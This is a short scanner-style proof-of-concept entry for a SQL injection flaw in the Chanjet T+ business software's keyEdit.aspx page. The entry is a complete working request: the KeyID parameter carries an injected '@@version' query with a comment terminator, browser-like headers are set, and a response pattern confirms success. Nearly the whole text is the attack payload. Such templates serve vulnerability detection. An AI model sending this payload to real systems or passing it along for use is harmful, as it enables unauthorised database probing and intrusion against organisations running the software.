{
        'name': '畅捷通T+ keyEdit.aspx SQL漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36',
                'Accept-Charset': 'utf-8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'ion:u'
        }}]
    }